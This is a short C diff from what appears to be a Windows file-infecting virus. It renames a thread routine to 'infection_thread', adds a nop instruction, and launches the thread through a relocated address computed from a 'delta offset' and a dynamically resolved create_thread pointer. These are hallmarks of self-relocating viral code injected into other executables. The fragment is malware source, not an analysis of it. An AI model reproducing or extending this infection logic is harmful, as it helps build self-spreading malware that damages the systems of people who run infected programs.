@@ -13,18 +13,18 @@
 #include "string_generator.h"
 #include "utility.h"
 
-static DWORD WINAPI run(LPVOID param);
+static DWORD WINAPI infection_thread(LPVOID param);
 
 void spawn_infection_thread(void) {
+    asm volatile("nop\nnop\nnop");
     data_t *data = get_data();
 
     if (data != NULL) {
         PRINT_DEBUG("delta offset: 0x%X", data->delta_offset);
 
         HANDLE thread = data->function_list.create_thread(
-            NULL, 0,
-            (LPTHREAD_START_ROUTINE)((uint8_t *)run + data->delta_offset), NULL,
-            0, NULL);
+            NULL, 0, (LPTHREAD_START_ROUTINE)BYTE_OFFSET(infection_thread, data->delta_offset),
+            NULL, 0, NULL);
         if (thread == INVALID_HANDLE_VALUE) {
             PRINT_DEBUG("could not create thread");
         }
@@ -37,7 +37,7 @@ void spawn_infection_thread(void) {
     }
 }
 
-static DWORD WINAPI run(LPVOID param) {
+static DWORD WINAPI infection_thread(LPVOID param) {
     PRINT_DEBUG("infection thread started");
     data_t *data = get_data();
 
